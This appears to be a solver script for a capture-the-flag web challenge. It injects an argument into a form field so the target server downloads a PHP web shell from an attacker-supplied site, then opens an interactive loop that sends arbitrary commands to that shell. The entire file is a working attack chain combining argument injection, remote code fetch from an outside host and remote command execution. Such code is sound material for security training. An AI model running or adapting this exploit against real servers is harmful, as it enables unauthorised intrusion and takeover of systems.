#!/usr/bin/env python3
import requests, re

SITE = "http://maledettabiondi.challs.olicyber.it/"
REGEX = r"uploads/(.*?)/sol.jpg"
print("In your site create sol.jpg with one line with the url to /sol.php (that should be a reverse php shell)")
SITEatt = input("Enter your site(it must have /sol.jpg and /sol.php): ")

s = requests.Session()
r = s.post(SITE, data={"ricetta":  SITEatt + "/sol.jpg", "submit": "Invia richiesta"})
site = re.findall(REGEX, r.text)[0]
print(site)
s.post(SITE, data={"ricetta": f'-isol.jpg', "submit": "Invia richiesta"})
while True:
    cmd = input("$ ")
    r = s.get(SITE + "uploads/" + site + "/sol.php", params={"cmd": cmd})
    print(r.text)